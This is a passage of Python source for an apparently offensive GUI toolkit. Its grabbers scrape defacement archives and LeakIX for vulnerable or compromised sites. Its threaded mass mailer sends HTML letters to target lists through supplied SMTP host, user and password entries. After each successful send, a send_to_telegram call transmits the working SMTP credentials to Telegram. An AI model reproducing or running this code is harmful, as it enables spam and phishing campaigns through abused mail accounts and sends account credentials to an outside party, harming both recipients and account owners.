        self.extrt_split.place(relx=0.96, rely=0.68, anchor=customtkinter.CENTER)

    def importEx_lst(self):
        try:
            self.extrt_textbox.delete("0.0", "end")
            userlist = filedialog.askopenfilename()
            
            with open(userlist, 'r', encoding='utf-8') as f:
                fulltxt = f.read()
            
            self.extrt_textbox.insert("0.0", fulltxt)

            self.auto_function()
        except:
            pass

    def netGun_win(self):
        self.show_info('Soon', 'Under Construction')

        return NetGun()

         #show_info('Soon', 'Under Construction.')

        self.checkers_root = customtkinter.CTkToplevel()
        self.checkers_root.title('Select')
        self.checkers_root.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.checkers_root.wm_iconphoto(False, mainico)
        self.checkers_root.attributes("-topmost", True)

        self.checkers_root = CTkListbox(self.checkers_root, command=self.checkersVar)
        self.checkers_root.pack(fill="both", expand=True, padx=10, pady=10)
    
        
        self.checkers_root.insert(0, "Phone Numbers")
        self.checkers_root.insert(1, "IPs/Domains")
        self.checkers_root.insert("END", "Emails")

    def chekPhone(self): 
        self.checkers_app = customtkinter.CTkToplevel()  # create CTk window like you do with the Tk window
        self.checkers_app.title(f'Valid IP/Domains Checker')
        self.checkers_app.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.checkers_app.wm_iconphoto(False, mainico)
        self.checkers_app.geometry("550x340")
        self.checkers_app.resizable(0,0)
        self.checkers_app.attributes("-topmost", True)

        ipchecker_textbox = customtkinter.CTkTextbox(self.checkers_app, width=410, height=340)
        ipchecker_textbox.grid(row=0, column=0, sticky="nsew")
        ipchecker_textbox.insert("0.0", "paste your text here.")

        ipchecker_log = customtkinter.CTkLabel(self.checkers_app, text="", fg_color="transparent")
        ipchecker_log.place(relx=0.9, rely=0.83, anchor=customtkinter.CENTER)

        # Use CTkButton instead of tkinter Button
        ipchek_button = customtkinter.CTkButton(master=self.checkers_app, text="Import")
        ipchek_button.place(relx=0.9, rely=0.9, anchor=customtkinter.CENTER)

    def checkersVar(self, value):
        if value == 'Phone Numbers':
            return self.show_info('Soon', 'under construction')
        elif value == 'Emails':
            return self.show_info('Soon', 'under construction')
        
        elif value == 'IPs/Domains':
            self.checkers_root.destroy()
            self.chekPhone()

    def grabbers_win(self):
        self.grabbers_root = customtkinter.CTkToplevel()
        self.grabbers_root.title('Select')
        self.grabbers_root.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.grabbers_root.wm_iconphoto(False, mainico)
        self.grabbers_root.attributes("-topmost", True)

        self.grabbers_op = CTkListbox(self.grabbers_root, command=self.grabbersVar)
        self.grabbers_op.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.grabbers_op.insert(0, "Live Laravel")
        self.grabbers_op.insert(1, "leakix")
        self.grabbers_op.insert(2, "zone-xsec")
        self.grabbers_op.insert(3, "haxor.id")
        self.grabbers_op.insert("END", "hypestat.com")

    def grabbersVar(self, value):      
        if value == 'Live Laravel':
            self.main_grabber('Laravel')
      
        elif value == 'leakix':
            self.main_grabber('leakix')

        elif value == 'zone-xsec':
            self.main_grabber('zone-xsec')

        elif value == 'haxor.id':
            self.main_grabber('haxor.id')
        
        elif value == 'hypestat.com':
            self.main_grabber('hypestat.com')

        else:
            return self.show_info('Soon', 'Under Construction')

    def main_grabber(self, type):

        def startGrabber(type):
            global lrvlgrabstop
                
            fromvalue = int(self.fromPage_slider.get())
            tovalue = int(self.toPage_slider.get())

            self.start_button.configure(text="Stop", command=StopGrabber)
            lrvlgrabstop = "false"

            if type == 'Laravel':
                IpS(fromvalue, tovalue)
            elif type == 'leakix':
                leakix(fromvalue, tovalue)
            elif type == 'zone-xsec':
                zoneX(fromvalue, tovalue)
            elif type == 'haxor.id':
                haxor(fromvalue, tovalue)
            elif type == 'hypestat.com':
                Hypestat(fromvalue, tovalue)

        def IpS(fromvalue, tovalue):
            global lrvlgrabstop

            fromvalue = int(fromvalue)
            tovalue = int(tovalue)

            Head={'User-Agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro Build/RKQ1.200826.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/90.0.4430.210 Mobile Safari/537.36'}
            
            totalValid = 0
            consolelog('INFO', "Grabber Starting...")
            for page in range(fromvalue, tovalue):

                if lrvlgrabstop == 'true':
                    break

                while True:

                    if lrvlgrabstop == 'true':
                        return

                    try:     
                        UrlWebs = 'http://bitverzo.com/recent_ip?p='+str(page)    
                        Shin = requests.get(UrlWebs, headers=Head, timeout=15).content
                        
                        consolelog('INFO', f"GET {UrlWebs} > OK")
                        break  
                    except Exception as err:
                        consolelog('INFO', err)

                try:
                    Shine = re.findall('<a href="http://bitverzo.com/ip/(.*?)">', str(Shin))
                    
                    Shine = set(Shine)
                    for xxx in Shine:
                        Repshin = xxx.replace('http://bitverzo.com/ip/', '')
                        with open('Result/Grabber/Laravel.txt', 'a', encoding="utf-8") as f:
                            f.write(Repshin+'\n')
                        
                     
                        totalValid += 1
                        self.grabber_textbox.insert('0.0', Repshin + '\n')
            
                        self.grabber_app.title(f'Grabber > {type} > {totalValid}')

                
                except Exception as err:
                    consolelog('INFO', err)

            self.start_button.configure(text="Start", command=sgTrigger)  
            consolelog('INFO', "Laravel Grabber Stop.") 

        def zoneX(fromvalue, tovalue):
            global lrvlgrabstop

            fromvalue = int(fromvalue)
            tovalue = int(tovalue)

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
            
            totalValid = 0

            consolelog('INFO', "Grabber Starting...")
            for page in range(fromvalue, tovalue):

                if lrvlgrabstop == 'true':
                    break

                while True:

                    if lrvlgrabstop == 'true':
                        break

                    try:     
                        url = f'https://zone-xsec.com/archive/page={page}'
                        respo = requests.get(url , headers=headers, timeout=15).text
                        
                        consolelog('INFO', f"GET {url} > OK")
                        break  
                    except Exception as err:
                        consolelog('INFO', err)

                try:
                    respo = str(respo).replace('\n','')
                    sites = reg('"></td><td></td><td>(.*?)</td><td><a',str(respo))
                    sites = [sites for sites in sites if '...' not in str(sites) and '....' not in str(sites) and '..' not in str(sites)]
                    sites = [*set(sites)]
                    if str(sites) != '[]':
                        for site in sites:

                            totalValid += 1
                            self.grabber_textbox.insert('0.0', site + '\n')
                            self.grabber_app.title(f'Grabber > {type} > {totalValid}')
                    
                            with open('Result/Grabber/zone-xsec.txt', 'a', encoding="utf-8") as f:
                                f.write(site+'\n')

                except Exception as err:
                    consolelog('INFO', err)

            self.start_button.configure(text="Start", command=sgTrigger)  
            consolelog('INFO', "Zone-X Grabber Stop.")    

        def haxor(fromvalue, tovalue):
            global lrvlgrabstop

            fromvalue = int(fromvalue)
            tovalue = int(tovalue)

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

            totalValid = 0

            consolelog('INFO', "Grabber Starting...")
            for page in range(fromvalue, tovalue):
                if lrvlgrabstop == 'true':
                    break
                while True:
                    if lrvlgrabstop == 'true':
                        break
                    try:
                        url = f'https://haxor.id/archive?page={page}'
                        respo = requests.get(url , headers=headers, timeout=15).text
                        consolelog('INFO', f"GET {url} > OK")
                        break
                    
                    except Exception as err:
                        consolelog('INFO', err)

                
                try:
                    sites = reg('<a rel="nofollow" title="(.*?)"',str(respo))

                    sites = [sites for sites in sites if '...' not in str(sites) and '....' not in str(sites) and '..' not in str(sites)]
                    sites = [*set(sites)]

                    if str(sites) != '[]':
                        for site in sites:
                            totalValid += 1
                            self.grabber_textbox.insert('0.0', site + '\n')
                            self.grabber_app.title(f'Grabber > {type} > {totalValid}')
                    
                            with open('Result/Grabber/hoxor.txt', 'a', encoding="utf-8") as f:
                                f.write(site+'\n')
                    
                except Exception as err:
                    consolelog('INFO', err)
            
            self.start_button.configure(text="Start", command=sgTrigger) 
            consolelog('INFO', "Hoxor Grabber Stop.")

        def Hypestat(fromvalue, tovalue):
            global lrvlgrabstop

            fromvalue = int(fromvalue)
            tovalue = int(tovalue)

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}

            totalValid = 0

            consolelog('INFO', "Grabber Starting...")
            for page in range(fromvalue, tovalue):

                if lrvlgrabstop == 'true':
                    break

                while True:
                    if lrvlgrabstop == 'true':
                        break
                    
                    try:
                        url = f'https://hypestat.com/recently-updated/{page}'
                        respo = requests.get(url , headers=headers).text
                        consolelog('INFO', f"GET {url} > OK")
                        break
                    except Exception as err:
                        consolelog('INFO', err)

                try:
                    dates = reg('<dd>(.*?)<br>',str(respo))
                    respo = BeautifulSoup(respo,'html.parser')
                    links = respo.find_all('a', href=True)
                    links = [str(link).split('https://hypestat.com/info/')[1].split('">')[0] for link in links if 'https://hypestat.com/info/' in str(link)]
                    links = [*set(links)]

                    if str(links) != '[]':
                        for site in links:
                            totalValid += 1
                            self.grabber_textbox.insert('0.0', site + '\n')
                            self.grabber_app.title(f'Grabber > {type} > {totalValid}')
                    
                            with open('Result/Grabber/hypestat.txt', 'a', encoding="utf-8") as f:
                                f.write(site+'\n')
                
                except Exception as err:
                    consolelog('INFO', err)
            
            self.start_button.configure(text="Start", command=sgTrigger) 
            consolelog('INFO', "Hypestat Grabber Stop.")

        def leakix(fromvalue, tovalue):
            global lrvlgrabstop

            fromvalue = int(fromvalue)
            tovalue = int(tovalue)

            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36'}
            
            totalValid = 0
            consolelog('INFO', "Grabber Starting...")

            userkeyword = self.leakix_entry.get()

            for page in range(fromvalue, tovalue):

                if lrvlgrabstop == 'true':
                    break

                while True:

                    if lrvlgrabstop == 'true':
                        break

                    try:     
                        url = f'https://leakix.net/search?scope=leak&page={page}&q={userkeyword}'
                        respo = requests.get(url , headers=headers, timeout=15).text
                        
                        consolelog('INFO', f"GET {url} > OK")
                        break  
                    except Exception as err:
                        consolelog('INFO', err)

                try:
                    links = reg('"></i> <a href="(.*?)"',str(respo))
                    links = [*set(links)]

                    if str(links) != '[]':
                        for site in links:
                            totalValid += 1
                            self.grabber_textbox.insert('0.0', site + '\n')
                            self.grabber_app.title(f'Grabber > {type} > {totalValid}')
                    
                            with open('Result/Grabber/leakix.txt', 'a', encoding="utf-8") as f:
                                f.write(site+'\n')
                
                except Exception as err:
                    consolelog('INFO', err)
            
            self.start_button.configure(text="Start", command=sgTrigger) 
            consolelog('INFO', "Hypestat Grabber Stop.")

        def sgTrigger():
            bot = threading.Thread(target=startGrabber, args=(type,))
            bot.daemon = True
            bot.start()

        def StopGrabber():
            global lrvlgrabstop

            lrvlgrabstop = 'true'

        self.grabbers_root.destroy()
        self.grabber_app = customtkinter.CTkToplevel()
        self.grabber_app.title(f'Grabber > {type}')
        self.grabber_app.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.grabber_app.wm_iconphoto(False, mainico)
        self.grabber_app.geometry("550x340")
        # self.grabber_app.resizable(0,0)
        self.grabber_app.attributes("-topmost", True)
        self.grabber_app.grid_columnconfigure(0, weight=1)
        self.grabber_app.grid_rowconfigure(0, weight=1)

        self.grabber_textbox = customtkinter.CTkTextbox(self.grabber_app, width=410, height=340)
        self.grabber_textbox.grid(row=0, column=0, sticky="nsew")
        self.grabber_textbox.insert("0.0", "")
     
        self.GrabberRS = customtkinter.CTkFrame(self.grabber_app, width=80, corner_radius=0, fg_color="transparent")
        self.GrabberRS.grid(row=0, column=1, sticky="nsew")
        self.GrabberRS.grid_rowconfigure((1,2,3,4,5,6,7), weight=0)
        self.GrabberRS.grid_columnconfigure(0, weight=1)

        self.start_button = customtkinter.CTkButton(master=self.GrabberRS, text="Start", command=sgTrigger, corner_radius=0)
        self.start_button.grid(row=0, column=0, sticky="nsew")

        self.export_button = customtkinter.CTkButton(master=self.GrabberRS, text="Export", command=self.export_lst, corner_radius=0)
        self.export_button.grid(row=1, column=0, sticky="nsew")

        self.ores_button = customtkinter.CTkButton(master=self.GrabberRS, text="Result", corner_radius=0)
        self.ores_button.grid(row=2, column=0, sticky="nsew")

        if type == 'Laravel':
            self.ores_button.configure(command=self.oresLaravel_trigger)
        elif type == 'zone-xsec':
            self.ores_button.configure(command=self.oresZoneXsec_trigger)
        elif type == 'haxor.id':
            self.ores_button.configure(command=self.oresHoxor_trigger)
        elif type == 'hypestat.com':
            self.ores_button.configure(command=self.oresHypestat_trigger)
        elif type == 'leakix':
            self.ores_button.configure(command=self.oresleakix_trigger)
               
        self.from_txt = customtkinter.CTkLabel(master=self.GrabberRS, text=f"From: 1", fg_color="transparent")
        self.from_txt.grid(row=3, column=0, padx=(0, 0), pady=(10, 0), sticky="nsew")

        self.fromPage_slider = customtkinter.CTkSlider(master=self.GrabberRS, from_=1, to=1, command=self.from_value, width=100)
        self.fromPage_slider.grid(row=4, column=0)

        if type == 'Laravel':
            self.fromPage_slider.configure(to=18318)
        elif type == 'zone-xsec':
            self.fromPage_slider.configure(to=50)
        elif type == 'haxor.id':
            self.fromPage_slider.configure(to=50) 
        elif type == 'hypestat.com':
            self.fromPage_slider.configure(to=2000) 
        elif type == 'leakix':
            self.fromPage_slider.configure(to=50)
        
        self.fromPage_slider.set(1)
      
        self.to_txt = customtkinter.CTkLabel(master=self.GrabberRS, text=f"To: 2", fg_color="transparent")
        self.to_txt.grid(row=5, column=0, sticky="nsew")

        self.toPage_slider = customtkinter.CTkSlider(master=self.GrabberRS, from_=2, to=2, command=self.to_value, width=100)
        self.toPage_slider.grid(row=6, column=0)

        if type == 'Laravel':
            self.toPage_slider.configure(to=18318)
        elif type == 'zone-xsec':
            self.toPage_slider.configure(to=50)
        elif type == 'haxor.id':
            self.toPage_slider.configure(to=50)
        elif type == 'hypestat.com':
            self.toPage_slider.configure(to=2000)
        elif type == 'leakix':
            self.toPage_slider.configure(to=50)

        self.toPage_slider.set(2)

        if type == 'leakix':
            self.sleakix = customtkinter.StringVar(value="laravel")
            self.leakix_entry = customtkinter.CTkEntry(self.GrabberRS, width=100, textvariable=self.sleakix, height=30)
            self.leakix_entry.grid(row=7, column=0, padx=(0, 0), pady=(10, 0))


    def export_lst(self):
        ex_res = self.grabber_textbox.get("0.0", "end")
    
        filename = filedialog.asksaveasfilename(filetypes=[("txt file", ".txt")], defaultextension=".txt")
        
        if str(filename) == "None":
            return
        
        with open(filename, 'w', encoding='utf-8') as fh:
            fh.write(ex_res)
        
        self.auto_function()
        return self.show_checkmark('Success', 'Saved Successfully.')

    def oresLaravel_trigger(self):
        self.GetResult('Result/Grabber/Laravel.txt')
        
    def oresZoneXsec_trigger(self):
        self.GetResult('Result/Grabber/zone-xsec.txt')

    def oresHoxor_trigger(self):
        self.GetResult('Result/Grabber/hoxor.txt')
    
    def oresHypestat_trigger(self):
        self.GetResult('Result/Grabber/hypestat.txt')

    def oresleakix_trigger(self):
        self.GetResult('Result/Grabber/leakix.txt')

    def from_value(self, value):
        fromvar =  int(value)
        self.from_txt.configure(text=f"From: {fromvar}")

    def to_value(self, value):
        tovar =  int(value)
        self.to_txt.configure(text=f"{tovar}")

    def smtpVar(self, value):
        if value == 'Mailer':
            return self.mailer_win()
      
        elif value == 'Checker':
            return self.checker_win()

    def smtp_win(self):
        self.smtp_root = customtkinter.CTkToplevel()
        self.smtp_root.title('Select')
        self.smtp_root.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.smtp_root.wm_iconphoto(False, mainico)       
        self.smtp_root.attributes("-topmost", True)

        self.smtp_op = CTkListbox(self.smtp_root, command=self.smtpVar)
        self.smtp_op.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.smtp_op.insert(0, "Mailer")
        self.smtp_op.insert("END", "Checker")

    def mailer_win(self):    
        self.smtp_root.destroy()
        self.mailer_app = customtkinter.CTkToplevel()
        self.mailer_app.title(f'Mailer')
        self.mailer_app.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.mailer_app.wm_iconphoto(False, mainico) 
        self.mailer_app.geometry("1040x400")
        self.mailer_app.resizable(0,0)
        self.mailer_app.attributes("-topmost", True)

        self.letter_txt = customtkinter.CTkLabel(master=self.mailer_app, text=f"Letter [HTML]", fg_color="transparent")
        self.letter_txt.place(relx=0.18, rely=0.1, anchor=customtkinter.CENTER)

        self.RenderBtn = customtkinter.CTkButton(master=self.mailer_app, text="Preview", height=15, width=50, command=self.RenderLetter)
        self.RenderBtn.place(relx=0.3, rely=0.1, anchor=customtkinter.CENTER)

        self.litter_textbox = customtkinter.CTkTextbox(self.mailer_app, width=310, height=240)
        self.litter_textbox.place(relx=0.18, rely=0.45, anchor=customtkinter.CENTER)
        self.litter_textbox.insert("0.0", "<center><h1>Predator</h1></center>")
        
        self.litterEncrypt = customtkinter.CTkButton(master=self.mailer_app, text="Encrypt", command=self.encodeLitter)
        self.litterEncrypt.place(relx=0.11, rely=0.83, anchor=customtkinter.CENTER)

        self.litterImport = customtkinter.CTkButton(master=self.mailer_app, text="Import", command=self.litterImport)
        self.litterImport.place(relx=0.25, rely=0.83, anchor=customtkinter.CENTER)

        self.emails_txt = customtkinter.CTkLabel(master=self.mailer_app, text=f"Emails", fg_color="transparent")
        self.emails_txt.place(relx=0.5, rely=0.1, anchor=customtkinter.CENTER)

        self.emails_textbox = customtkinter.CTkTextbox(self.mailer_app, width=310, height=240)
        self.emails_textbox.place(relx=0.5, rely=0.45, anchor=customtkinter.CENTER)
        # self.emails_textbox.insert("0.0", "x@x")
        self.emails_textbox.insert("0.0", "target@mail.com")

        self.emailsImport = customtkinter.CTkButton(master=self.mailer_app, text="Import", width=290, command=self.emailsImport)
        self.emailsImport.place(relx=0.5, rely=0.83, anchor=customtkinter.CENTER)

        self.smtp_txt = customtkinter.CTkLabel(master=self.mailer_app, text=f"SMTP", fg_color="transparent")
        self.smtp_txt.place(relx=0.82, rely=0.1, anchor=customtkinter.CENTER)

        self.send_button = customtkinter.CTkButton(master=self.mailer_app, text="Send", width=250, command=self.startMailer)
        self.send_button.place(relx=0.82, rely=0.93, anchor=customtkinter.CENTER)

        self.smtp_textbox = customtkinter.CTkTextbox(self.mailer_app, width=310, height=240)
        self.smtp_textbox.place(relx=0.82, rely=0.45, anchor=customtkinter.CENTER)
        self.smtp_textbox.insert("0.0", "host|port|user|pass")

        self.smtpSplit = customtkinter.CTkComboBox(master=self.mailer_app, values=["Custom", "host|port|user|pass", "host,port,user,pass", "host port user pass"],)
        self.smtpSplit.place(relx=0.75, rely=0.83, anchor=customtkinter.CENTER)

        self.smtpImport = customtkinter.CTkButton(master=self.mailer_app, text="Import", command=self.smtpImport)
        self.smtpImport.place(relx=0.89, rely=0.83, anchor=customtkinter.CENTER)

        subjectVar = customtkinter.StringVar(value="Subject")
        self.mailerSubject = customtkinter.CTkEntry(master=self.mailer_app, width=130, height=30, textvariable=subjectVar)
        self.mailerSubject.place(relx=0.12, rely=0.93, anchor=customtkinter.CENTER)

        FromVar = customtkinter.StringVar(value="From？ <USER> = SMTP>user")
        self.mailerFrom = customtkinter.CTkEntry(master=self.mailer_app, width=130, height=30, textvariable=FromVar)
        self.mailerFrom.place(relx=0.25, rely=0.93, anchor=customtkinter.CENTER)

        self.mailerBots = customtkinter.CTkSlider(master=self.mailer_app, from_=1, to=8, command=self.mailerBots, width=200)
        self.mailerBots.place(relx=0.57, rely=0.93, anchor=customtkinter.CENTER)
        self.mailerBots.set(5)

        self.mailerB_txt = customtkinter.CTkLabel(master=self.mailer_app, text=f"Threads: 5", fg_color="transparent")
        self.mailerB_txt.place(relx=0.43, rely=0.93, anchor=customtkinter.CENTER)

    def litterImport(self):
        usrletter = filedialog.askopenfilename(filetypes=[("html file", ".html")])
        
        with open(usrletter, 'r', encoding='utf-8') as f:
            letter = f.read()
        
        self.litter_textbox.delete("0.0", "end")
        self.litter_textbox.insert("0.0", letter + '\n')

    def emailsImport(self):
        usremails = filedialog.askopenfilename(filetypes=[("txt file", ".txt")])
        
        with open(usremails, 'r', encoding='utf-8') as f:
            usremails = f.read()
        
        self.emails_textbox.delete("0.0", "end")
        self.emails_textbox.insert("0.0", usremails)

    def startMailer(self):
        global stopMailer
        global mailerError
        global sentCount
        global MailerEmails
        global MailerSmtps
        global MailerOneBot

        MailerOneBot = True
        MailerEmails = []
        MailerSmtps = []
        mailerError = 0
        sentCount = 0
        stopMailer = 'false'
        smtpType = self.smtpSplit.get()
        rootEmails = self.emails_textbox.get("0.0", "end")
        rootsmtps = self.smtp_textbox.get("0.0", "end")
        rootSubject = self.mailerSubject.get()
        rootSubject = rootSubject.replace('\n', '')
        rootFrom = self.mailerFrom.get()

        if rootFrom == 'From? <USER> = SMTP user':
            return self.show_info(':D', 'From input [Sender Name] Required!')

        if len(rootFrom) > 1:
            pass
        else:
            return self.show_info(':D', 'From input [Sender Name] Required!')


        if smtpType == 'Custom':
            return self.show_info(':D', 'Enter SMTP Split value \n [|, :]')
        
        if rootSubject == 'Subject':
            return self.show_info(':D', 'Enter Subject')

        if len(rootEmails) > 1:
            pass
        else:
            return self.show_info(':D', 'No Emails!')

        if len(rootsmtps) > 1:
            pass
        
        else:
            return self.show_info(':D', 'No SMTP!')

        if rootsmtps == "host|port|user|pass\n":
            return self.show_info(':D', 'No SMTP!')

        if smtpType == 'host|port|user|pass':
            smtpType = "|"
        elif smtpType == 'host,port,user,pass':
            smtpType = ","
        elif smtpType == 'host port user pass':
            smtpType = " "
    
        usrletter = self.litter_textbox.get("0.0", "end")

        try:
            os.remove('tmp/letter.html')
            os.remove('tmp/emails.txt')
            os.remove('tmp/smtp.txt')
        except:
            pass
        
        try:
            with open('tmp/letter.html', 'w', encoding="utf-8") as f:
                f.write(usrletter)
            
            with open('tmp/emails.txt', 'w', encoding="utf-8") as f:
                f.write(rootEmails)

            with open('tmp/emails.txt', 'r', encoding="utf-8") as f:
                MailerEmails = list(f)

            with open('tmp/smtps.txt', 'w', encoding="utf-8") as f:
                f.write(rootsmtps)

            with open('tmp/smtps.txt', 'r', encoding="utf-8") as f:
                MailerSmtps = list(f)

        except Exception as err:
            self.show_error('Error!', err)
            return console.print_exception(show_locals=True)
        

        if len(MailerSmtps) == 0:
            self.show_info(':D', 'No SMTP!')
            return consolelog('INFO', "No SMTP!")
        
        if len(MailerEmails) == 0:
            self.show_info(':D', 'No Emails!')
            return consolelog('INFO', "No Emails!")
        
        
        self.mailer_app.title(f'Mailer > Targets: {len(rootEmails)}, SMTP: {len(MailerSmtps)} Sent: {sentCount}, Failure: {mailerError}')

        self.send_button.configure(text="Stop", command=self.StopMailer)

        consolelog('INFO', "Starting Mailer...")

        for bot in range(int(MailerBots)):
            bot = threading.Thread(target=self.sMailer, args=(smtpType, rootSubject, rootFrom))
            bot.daemon = True
            bot.start()

    def sMailer(self, sp, usubject, uFrom):
        global stopMailer
        global mailerError
        global sentCount
        global MailerEmails
        global MailerSmtps
        global MailerBots
        global MailerOneBot

        while True:
            if stopMailer == 'true':
                break

            if len(MailerEmails) == 0:
                break
            if len(MailerSmtps) == 0:
                break

            smtp = Xchoice(MailerSmtps)
            smtp = smtp.replace('\n', '')

            targetEmail = Xchoice(MailerEmails)
            targetEmail = targetEmail.replace('\n', '')
            
            if '@' in targetEmail:
                pass
            else:
                MailerEmails.remove(f"{targetEmail}\n")
                continue

            if len(str(smtp)) > 1:
                pass
            else:
                MailerSmtps.remove(f"{smtp}\n")
                continue

            if len(MailerEmails) == 0:
                break
            if len(MailerSmtps) == 0:
                break

            try:
                with open('tmp/letter.html', 'r', encoding="utf-8") as f:
                    uletter = f.read()
            
            except Exception as err:
                consolelog('INFO', err)
                self.show_error('Error!', err)
                break
            
            try:
                uhost = smtp.split(sp)[0]
                uport = smtp.split(sp)[1]
                user = smtp.split(sp)[2]
                pwd = smtp.split(sp)[3]

                
            except Exception as err:
                consolelog('INFO', f"{smtp} > {err}")
                continue

            if uFrom == '<USER>':
                uFrom = user

            consolelog('INFO', f'\nTarget: {targetEmail}\nSMTP: {smtp}\nSubject: {usubject}\nFrom: {uFrom}')

            if str(uport) == "465":
                message = EmailMessage()
                message["From"] = uFrom
                message["To"] = targetEmail
                message["Subject"] = usubject

                with open('tmp/letter.html', 'r', encoding="utf-8") as fp:
                    message.set_content(fp.read(), 'html')
                
                try:
                    # no need for a context if you are just using the default SSL
                    with smtplib.SMTP_SSL(uhost, 465, timeout=15000) as server:
                        server.login(user, pwd)
                        # Prefer the modern send_message method
                        server.send_message(message)
                        server.quit()
                    
                    MailerEmails.remove(f"{targetEmail}\n")
                    consolelog('INFO', f"{targetEmail} > Sent Successfully")
                    sentCount += 1
                    self.mailer_app.title(f'Mailer > Emails: {len(MailerEmails)}, SMTPs: {len(MailerSmtps)}, Sent: {sentCount}, Failure: {mailerError}')

                   
                    self.send_to_telegram(f"🤗MAILER\n <code> {uhost}|{uport}|{user}|{pwd} </code>")

                
                except Exception as err:
                    consolelog('INFO', err)
                    mailerError += 1
                    MailerSmtps.remove(f'{smtp}\n')

                    self.mailer_app.title(f'Mailer > Emails: {len(MailerEmails)}, SMTPs: {len(MailerSmtps)}, Sent: {sentCount}, Failure: {mailerError}')
                    consolelog('INFO', f"{smtp} > {err}")
                    
                
            else:   
                try:
                    msg = EmailMessage()

                    with open('tmp/letter.html', 'r', encoding="utf-8") as fp:
                        msg.set_content(fp.read(), subtype='html')

                    msg['Subject'] = usubject
                    msg['From'] = uFrom
                    msg['To'] = targetEmail
                    with smtplib.SMTP(uhost, int(uport)) as smtp:
                        smtp.starttls()
                        smtp.login(user, pwd)
                        smtp.send_message(msg)
                        smtp.quit()

                    MailerEmails.remove(f"{targetEmail}\n")
                    consolelog('INFO', f"{targetEmail} > Sent Successfully")
                    sentCount += 1
                    self.mailer_app.title(f'Mailer > Emails: {len(MailerEmails)}, SMTPs: {len(MailerSmtps)}, Sent: {sentCount}, Failure: {mailerError}')

                    self.send_to_telegram(f"🤗MAILER\n <code> {uhost}|{uport}|{user}|{pwd} </code>")
                
                except Exception as err:
                    consolelog('INFO', err)
                    mailerError += 1

                    consolelog('INFO', f"{smtp} > {err}")
                    
                    try:
                        MailerSmtps.remove(f'{smtp}\n')

                    except:
                        pass
                    
                    self.mailer_app.title(f'Mailer > Emails: {len(MailerEmails)}, SMTPs: {len(MailerSmtps)}, Sent: {sentCount}, Failure: {mailerError}')

        if MailerOneBot == True:
            MailerOneBot = False
            self.send_button.configure(text="Send", command=self.startMailer, state="normal")
            consolelog('INFO', "Mailer Idle.")

            try:

                with open('tmp/emails.txt', 'w', encoding="utf-8") as f:
                    f.write("")

                if len(MailerEmails) == 0:
                    with open('tmp/emails.txt', 'w', encoding="utf-8") as f:
                        f.write(f"target@mail.com\n")

                else:
                    for em in MailerEmails:
                        with open('tmp/emails.txt', 'a', encoding="utf-8") as f:
                            f.write(f"{em}")



                with open('tmp/smtps.txt', 'w', encoding="utf-8") as f:
                    f.write(f"")

                if len(MailerSmtps) == 0:
                    with open('tmp/smtps.txt', 'w', encoding="utf-8") as f:
                        f.write(f"host|port|user|pass\n")
                else:
                    for sm in MailerSmtps:
                        with open('tmp/smtps.txt', 'a', encoding="utf-8") as f:
                            f.write(f"{sm}")

            except Exception as err:
                consolelog('INFO', err)
                self.show_error('Error!', err)
                
            self.smtp_textbox.delete("0.0", "end")
            with open('tmp/smtps.txt', 'r', encoding="utf-8") as f:
                for line in f:
                    self.smtp_textbox.insert("0.0", f"{line}")


            self.emails_textbox.delete("0.0", "end")
            with open('tmp/emails.txt', 'r', encoding="utf-8") as f:
                for line in f:
                    self.emails_textbox.insert("0.0", line)

    def StopMailer(self):
        global stopMailer

        stopMailer = 'true'
        self.send_button.configure(state="disabled")

    def smtpImport(self):
        usrsmtps = filedialog.askopenfilename(filetypes=[("txt file", ".txt")])
        
        try:
            with open(usrsmtps, 'r', encoding='utf-8') as f:
                usrsmtps = f.read()
        
        except:
            return
    
        self.smtp_textbox.delete("0.0", "end")
        self.smtp_textbox.insert("0.0", usrsmtps + '\n')

    def encodeLitter(self):
        litterSouce = self.litter_textbox.get("0.0", "end")
        decodedText = html.escape(litterSouce)
       # decodedText = html.unescape(encodedText)

        self.litter_textbox.delete("0.0", "end")
        self.litter_textbox.insert("0.0", decodedText)

    def xRenderLetter(self):
        letterS = self.litter_textbox.get("0.0", "end")

        try:
            browser = webdriver.Firefox()
            browser.get(f'file:///{os.getcwd()}\\tmp\\letter.html')

        except Exception as err:
            return self.show_error('Error!', err)

    def RenderLetter(self):
        self.RenderBtn.configure(state="disabled")

        bot = threading.Thread(target=self.xRenderLetter)
        bot.daemon = True
        bot.start()

        self.RenderBtn.configure(state="normal")

    def mailerBots(self, value):
        global MailerBots

        MailerBots = int(value)
        self.mailerB_txt.configure(text=f"Threads: {MailerBots}")

    def checker_win(self):
        self.smtp_root.destroy()
        self.smtpChecker_app = customtkinter.CTkToplevel()
        self.smtpChecker_app.title(f'SMTP Checker')
        self.smtpChecker_app.iconbitmap('core/logo.ico')
        ico = Image.open('core/logo.png')
        mainico = ImageTk.PhotoImage(ico)
        self.smtpChecker_app.wm_iconphoto(False, mainico) 
        self.smtpChecker_app.geometry("550x340")
        self.smtpChecker_app.resizable(0,0)
        #self.smtpChecker_app.attributes("-topmost", True)

